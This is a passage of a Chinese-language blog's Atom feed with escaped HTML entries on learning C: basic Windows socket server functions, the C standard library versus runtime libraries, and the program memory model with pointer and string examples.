&lt;p&gt;编译:gcc -g -o server server.c -l wsock32&lt;/p&gt;
&lt;p&gt;如果你装了MinGW,你也可以尝试一下。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;今年有两个目标，一个是做开源项目，第二个是用C写一个网络服务。C写网络服务Socket是基础，首先需要了解socket的用法。服务端socket操作步骤:1.创建socket,2.绑定地址及端口,3.接收请求,4.发送数据。&lt;/p&gt;
&lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;p&gt;1.创建socket:&lt;br&gt;int socket(int domain, int type, int protocol);&lt;br&gt;domain：协议域&lt;br&gt;type：指定Socket类型。&lt;br&gt;protocol：指定协议。&lt;br&gt;返回值：如果调用成功就返回新创建的套接字的描述符，如果失败就返回-1。&lt;/p&gt;
&lt;p&gt;2.绑定地址级端口&lt;br&gt;int bind(SOCKET socket, const struct sockaddr* address, socklen_t address_len);&lt;br&gt;参数说明：&lt;br&gt;socket：是一个套接字描述符。&lt;br&gt;address：是一个sockaddr结构指针，该结构中包含了要结合的地址和端口号。&lt;br&gt;address_len：确定address缓冲区的长度。&lt;br&gt;返回值：如果函数执行成功，返回值为0，否则为SOCKET_ERROR。&lt;/p&gt;
&lt;p&gt;3.接收连接请求&lt;br&gt;int accept( int fd, struct socketaddr&lt;em&gt; addr, socklen_t&lt;/em&gt; len);&lt;br&gt;参数说明：&lt;br&gt;fd：套接字描述符。&lt;br&gt;addr：返回连接着的地址&lt;br&gt;len：接收返回地址的缓冲区长度&lt;br&gt;返回值：成功返回客户端的文件描述符，失败返回-1。&lt;/p&gt;
&lt;p&gt;4.发送数据&lt;br&gt;int send(int fd, const void * msg, int len, unsigned int falgs);&lt;br&gt;fd：套接字描述符。&lt;br&gt;msg: 数据内容。&lt;br&gt;len: 数据长度。&lt;br&gt;返回值：成功则返回实际传送出去的字符数, 失败返回-1.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C语言之函数库</title>
    <link href="http://binyanbin.github.io/2016/03/31/c-4/"/>
    <id>http://binyanbin.github.io/2016/03/31/c-4/</id>
    <published>2016-03-30T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;为什么写C的需要了解更多系统方面的知识，我们可以从C语言的函数库说起。&lt;/p&gt;
&lt;h1 id=&quot;C标准库&quot;&gt;&lt;a href=&quot;#C标准库&quot; class=&quot;headerlink&quot; title=&quot;C标准库&quot;&gt;&lt;/a&gt;C标准库&lt;/h1&gt;&lt;p&gt;C标准库，顾名思义既然是标准，就是由标准组织制定的。C标准库就是任何平台都可以使用的基本C语言库。&lt;br&gt;标准库是C标准定义了一系列常用的函数，称为C库函数。C标准仅仅定义了函数原型，并没有提供实现。因此这个任务留给了各个支持C语言标准的编译器。你只使用标准库写的代码可以跨平台使用。&lt;/p&gt;
&lt;h1 id=&quot;运行库&quot;&gt;&lt;a href=&quot;#运行库&quot; class=&quot;headerlink&quot; title=&quot;运行库&quot;&gt;&lt;/a&gt;运行库&lt;/h1&gt;&lt;p&gt;它由不同操作系统不同开发平台提供不同的C运行库。但是C运行库的部分实现是基于C标准库的，即C运行库是各个操作系统各个开发工具根据自身平台开发的库，某种程度上，可以说C运行库是C标准库的一个扩展库，只是加了很多C标准库所没有的与平台相关的或者不相关的库接口函数。&lt;br&gt;一个运行库包括以下功能:&lt;br&gt;1.启动与退出：包括入口函数及入口函数所依赖的其他函数等。&lt;br&gt;2.标准函数：由C语言标准规定的C语言标准库所拥有的函数实现。（C标准库）&lt;br&gt;3.I/O：I/O功能的封装和实现，参见上一节中I/O初始化部分。&lt;br&gt;4.堆：堆的封装和实现，参见上一节中堆初始化部分。&lt;br&gt;5.语言实现：语言中一些特殊功能的实现。&lt;br&gt;6.调试：实现调试功能的代码。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行库是平台相关的，因为它与操作系统结合得非常紧密。C语言的运行库从某种程度上来讲是C语言的程序和不同操作系统平台之间的抽象层，它将不同的操作系统API抽象成相同的库函数。比如我们可以在不同的操作系统平台下使用fread来读取文件，而事实上fread(标准库函数)在不同的操作系统平台下的实现是不同的，但作为运行库的使用者我们不需要关心这一点。&lt;/li&gt;
&lt;li&gt;虽然各个平台下的C语言运行库提供了很多功能，但很多时候它们毕竟有限，比如用户的权限控制等都不是属于标准的C语言运行库。于是我们不得不通过其他的办法，诸如绕过C语言运行库直接调用操作系统API或使用其他的库。&lt;/li&gt;
&lt;li&gt;linux和Windows平台下的两个主要C语言运行库分别为glibc（GNU C Library）和MSVCRT（Microsoft Visual C Run-time），我们在下面将会分别介绍它们。值得注意的是，像线程操作这样的功能并不是标准的C语言运行库的一部分，但是glibc和MSVCRT都包含了线程操作的库函数。比如glibc有一个可选的pthread库中的pthread_create()函数可以用来创建线程；而MSVCRT中可以使用_beginthread()函数来创建线程。所以glibc和MSVCRT事实上是标准C语言运行库的超集，它们各自对C标准库进行了一些扩展。&lt;br&gt;&lt;img src=&quot;/img/c-6.jpg&quot; alt=&quot;关系图&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;为什么写C的需要了解更多系统方面的知识，我们可以从C语言的函数库说起。&lt;/p&gt;
&lt;h1 id=&quot;C标准库&quot;&gt;&lt;a href=&quot;#C标准库&quot; class=&quot;headerlink&quot; title=&quot;C标准库&quot;&gt;&lt;/a&gt;C标准库&lt;/h1&gt;&lt;p&gt;C标准库，顾名思义既然是标准，就是由标
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C语言之由内存模型说起</title>
    <link href="http://binyanbin.github.io/2016/03/25/c-3/"/>
    <id>http://binyanbin.github.io/2016/03/25/c-3/</id>
    <published>2016-03-24T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;说起内存模型，那就先要介绍程序运行时是如何管理内存的。&lt;br&gt;程序运行时:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统先把物理硬盘代码load到内存&lt;/li&gt;
&lt;li&gt;系统再把c代码分成四个区&lt;/li&gt;
&lt;li&gt;系统再找到main函数入口执行&lt;h2 id=&quot;程序的四区模型&quot;&gt;&lt;a href=&quot;#程序的四区模型&quot; class=&quot;headerlink&quot; title=&quot;程序的四区模型&quot;&gt;&lt;/a&gt;程序的四区模型&lt;/h2&gt;&lt;img src=&quot;/img/c-3.png&quot; alt=&quot;效果&quot;&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
一个由C编译的程序的内存分配通常由以下几块组成:&lt;br&gt;1 栈区(stack)由编译器自动分配释放,存放函数的参数值,局部变量的值等。其操作方式类似于数据结构中的栈。&lt;br&gt;2 堆区(heap):一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。&lt;br&gt;3 全局区：主要包括静态全局区和常量区，程序结束后由系统释放。&lt;br&gt;静态区(static):全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域,未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。&lt;br&gt;常量区:常量字符串就是放在这里的。&lt;br&gt;4 代码区：存放函数体的二进制代码。&lt;br&gt;示例:&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;*&lt;span class=&quot;title&quot;&gt;fa&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;*pa = &lt;span class=&quot;string&quot;&gt;&quot;123456&quot;&lt;/span&gt;;&lt;span class=&quot;comment&quot;&gt;//pa指针在栈区，“123456”在常量区，该函数调用完后指针变量pa就被释放了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;*p = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;span class=&quot;comment&quot;&gt;//指针变量p在栈中分配4字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    p=(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;*)&lt;span class=&quot;built_in&quot;&gt;malloc&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;);&lt;span class=&quot;comment&quot;&gt;//本函数在这里开辟了一块堆区的内存空间，并把地址赋值给p&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;strcpy&lt;/span&gt;(p, &lt;span class=&quot;string&quot;&gt;&quot;wudunxiong 1234566&quot;&lt;/span&gt;);&lt;span class=&quot;comment&quot;&gt;//把常量区的字符串拷贝到堆区&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; p;&lt;span class=&quot;comment&quot;&gt;//返回给主调函数fb()，相对fa来说fb是主调函数，相对main来说，fa(),fb()都是被调用函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由此可以得知，当一个程序运行时，他的全局区，代码区基本是固定不变的，堆区与全局区和代码区均由系统控制。开发人员需对堆区内存进行管理。在现代开发语言(java,c#,javascript等)里,堆区内存管理都是由垃圾回收器处理的。&lt;/p&gt;
&lt;h2 id=&quot;内存管理基础-指针&quot;&gt;&lt;a href=&quot;#内存管理基础-指针&quot; class=&quot;headerlink&quot; title=&quot;内存管理基础:指针&quot;&gt;&lt;/a&gt;内存管理基础:指针&lt;/h2&gt;&lt;p&gt;指针是一个变量,其值为另一个变量的地址,即内存位置的直接地址。就像其他变量或常量一样,您必须在使用指针存储其他变量地址之前,对其进行声明。指针变量声明的一般形式为：type *var-name;&lt;br&gt;示例如下:&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;  var = &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;;   &lt;span class=&quot;comment&quot;&gt;/* 实际变量的声明 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;  *ip;        &lt;span class=&quot;comment&quot;&gt;/* 指针变量的声明 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   ip = &amp;amp;var;  &lt;span class=&quot;comment&quot;&gt;/* 在指针变量中存储 var 的地址 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Address of var variable: %x\n&quot;&lt;/span&gt;, &amp;amp;var  );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;comment&quot;&gt;/* 在指针变量中存储的地址 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Address stored in ip variable: %x\n&quot;&lt;/span&gt;, ip );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;comment&quot;&gt;/* 使用指针访问值 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Value of *ip variable: %d\n&quot;&lt;/span&gt;, *ip );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;字符串&quot;&gt;&lt;a href=&quot;#字符串&quot; class=&quot;headerlink&quot; title=&quot;字符串&quot;&gt;&lt;/a&gt;字符串&lt;/h2&gt;&lt;p&gt;在C语言中,字符串实际上是使用null字符 ‘\0’ 终止的一维字符数组.因此,一个以null尾的字符串,包含了组成字符串的字符.&lt;br&gt;下面的声明和初始化创建了一个”Hello”字符串.由于在数组的末尾存储了空字符,所以字符数组的大小比单词”Hello”的字符数多一个。&lt;br&gt;&lt;img src=&quot;/img/c-4.jpg&quot; alt=&quot;效果&quot;&gt;&lt;/p&gt;
&lt;p&gt;c语言标准库没有常用的字符串方法，如indexOf,lastIndexOf,trim,lTrim,rTrim等方法。如是我就自己尝试实现，中间用了几个标准库函数:strcpy字符串拷贝，strcat字符串连接，这个方法不能直接用，C中的字符串内存不是自动扩展需要自己申请,strcat是把第二个字符串copy到第一个字符串结尾，需要第一个字符串分配的内存足够多，不然无法连接。strstr查找相同的字符串，返回的又是地址。整个代码全是内存操作，自已申请的内存一定要记得释放，对于用惯了现代语言的人来说，这真是相当虐心啊。&lt;br&gt;&lt;img src=&quot;/img/c-5.jpg&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;还是看代码吧&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;138&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span 